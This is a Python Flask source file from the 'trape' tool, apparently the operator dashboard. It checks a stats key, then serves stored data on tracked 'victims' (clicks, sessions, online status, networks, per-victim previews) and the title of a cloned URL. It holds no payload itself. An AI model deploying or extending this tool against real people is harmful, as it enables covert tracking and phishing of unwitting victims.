#!/usr/bin/env python
# -*- coding: utf-8 -*-
#**
#
#########
# trape #
#########
#
# trape depends of this file
# For full copyright information this visit: https://github.com/boxug/trape
#
# Copyright 2017 by boxug / <hey@boxug.com>
#**
import urllib2
from flask import Flask, render_template, session, request, json
from core.trape import Trape
from core.db import Database

# Main parts, to generate relationships among others
trape = Trape()
app = Flask(__name__, template_folder='../templates', static_folder='../static')

# call database
db = Database()

# preview header tool in console
trape.header()

@app.route("/" + trape.stats_path)
def index():
    return render_template("/login.html")

@app.route("/logout")
def logout():
    return render_template("/login.html")

@app.route("/login", methods=["POST"])
def login():
    id = request.form['id']
    if id == trape.stats_key:
        return json.dumps({'status':'OK', 'path' : trape.home_path, 'victim_path' : trape.victim_path, 'url_to_clone' : trape.url_to_clone, 'app_port' : trape.app_port, 'date_start' : trape.date_start, 'user_ip' : '127.0.0.1'});
    else:
      return json.dumps({'status':'NOPE', 'path' : '/'});

@app.route("/get_data", methods=["POST"])
def home_get_dat():
    d = db.sentences_stats('get_data')
    n = db.sentences_stats('all_networks')

    rows = db.sentences_stats('get_clicks')
    c = rows[0][0]
    rows = db.sentences_stats('get_sessions')
    s = rows[0][0]
    vId = ('online', )
    rows = db.sentences_stats('get_online', vId)
    o = rows[0][0]

    return json.dumps({'status' : 'OK', 'd' : d, 'n' : n, 'c' : c, 's' : s, 'o' : o});

@app.route("/get_preview", methods=["POST"])
def home_get_preview():
    vId = request.form['vId']
    t = (vId,)
    d = db.sentences_stats('get_preview', t)
    n = db.sentences_stats('id_networks', t)
    return json.dumps({'status' : 'OK', 'vId' : vId, 'd' : d, 'n' : n});

@app.route("/get_title", methods=["POST"])
def home_get_title():
    opener = urllib2.build_opener()
    html = opener.open(trape.url_to_clone).read()
    html = html[html.find('<title>') + 7 : html.find('</title>')]
    return json.dumps({'status' : 'OK', 'title' : html});

@app.route("/get_requests", methods=["POST"])
def home_get_requests():
    d = db.sentences_stats('get_requests')

    return json.dumps({'status' : 'OK', 'd' : d});